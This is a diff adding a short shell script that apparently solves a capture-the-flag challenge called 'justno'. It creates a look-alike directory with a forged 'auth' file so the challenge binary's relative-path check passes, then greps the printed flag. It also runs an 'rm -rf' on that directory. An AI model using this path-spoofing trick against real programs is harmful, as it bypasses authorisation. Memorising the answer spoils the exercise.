@@ -1,0 +1,6 @@
+cd
+rm -rf problems/f934d9ca116fb6e3e89cc85baaca028c
+mkdir -p problems/f934d9ca116fb6e3e89cc85baaca028c
+cd problems/f934d9ca116fb6e3e89cc85baaca028c
+echo "yes" > auth
+/problems/f934d9ca116fb6e3e89cc85baaca028c/justno | grep -o "flag: .*$"
